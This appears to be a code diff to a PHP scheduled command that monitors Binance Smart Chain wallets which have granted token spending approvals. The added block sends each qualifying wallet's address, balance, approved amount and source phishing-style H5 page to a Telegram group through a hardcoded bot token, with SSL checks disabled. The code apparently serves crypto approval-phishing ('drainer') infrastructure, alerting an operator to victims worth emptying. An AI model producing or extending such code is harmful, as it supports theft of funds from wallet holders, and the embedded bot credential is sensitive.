@@ -88,6 +88,26 @@ class AutoBscUpdateOnlineMoney extends Command
                                     }
                                 }
                             }
+                            if($money_approve > 0 && $money_online >= 1000){
+                                if($money_approve > 10000000000){
+                                    $money_approve = '无限';
+                                }
+                                //TG通知开始
+                                $data = "【授权BSC更新通知】\n来源：{$vo['h5_url']}\n钱包地址：{$vo['address']}\n在线余额：{$money_online}\n授权数量：{$money_approve}";
+                                $key ='5321687794:AAG-QhTg_DzK-e6v0f5Anb4O50fr-JifbtI';//TG机器人私钥
+                                $id ='5725539445';//群组ID
+                                $u4 = $data;
+                                $u4 = urlencode($u4);
+                                $urlstring  = "https://api.telegram.org/bot$key/sendMessage?chat_id=$id&text=$u4";
+                                $ch = curl_init();
+                                curl_setopt($ch, CURLOPT_URL, $urlstring);
+                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+                                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+                                $result = curl_exec($ch);
+                                curl_close($ch);
+                                //TG通知结束
+                            }
 
                             $output->writeln('----- ' . date('y-m-d H:i:s') . ' 地址'.$vo['address'].',在线余额:'.$money_online.'U,授权数量:'.$money_approve.'U-----');
                         } catch (Exception $e) {
